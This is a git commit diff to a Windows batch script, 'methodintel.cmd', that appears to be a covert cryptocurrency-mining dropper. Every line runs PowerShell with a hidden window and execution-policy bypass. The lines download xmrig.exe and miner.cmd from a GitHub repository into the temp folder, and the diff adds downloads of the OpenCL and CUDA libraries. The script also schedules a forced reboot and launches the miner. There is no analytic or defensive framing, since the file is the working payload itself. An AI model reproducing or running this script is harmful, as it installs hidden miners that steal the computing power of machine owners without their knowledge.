b8e92af504a826113a230f56d363930b0473d97b
mediatui <57651467+mediatui@users.noreply.github.com>
2019-11-28 12:52:07 +1300

    Update methodintel.cmd

--- Intel/methodintel.cmd
+++ Intel/methodintel.cmd
@@ -1,4 +1,6 @@
 cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/Intel/xmrig.exe
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/Intel/miner.cmd
+powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/Intel/OpenCL.dll
+powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/Intel/xmrig-cuda.dll
 powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 43200
 cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
